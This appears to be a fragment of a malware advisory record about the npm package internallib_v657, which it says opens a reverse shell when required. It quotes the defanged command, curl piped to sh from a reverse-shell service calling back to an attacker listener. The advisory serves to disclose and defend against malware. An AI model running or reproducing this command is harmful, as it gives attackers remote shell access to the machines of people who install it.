  "summary": "Malicious code in internallib_v657 (npm)",
  "details": "Internallib_v657 is a 422-byte stub package whose index.js executes a reverse shell when the module is required. The exported command() function runs /bin/bash -c \"curl hxxps://reverse-shell[.]sh/10[.]0[.]73[.]186:443|sh\", downloading a shell script from the reverse-shell.sh service and piping it to sh, establishing a shell on the attacker's listener at 10[.]0[.]73[.]186:443. The package has no other functionality and no legitimate purpose.",
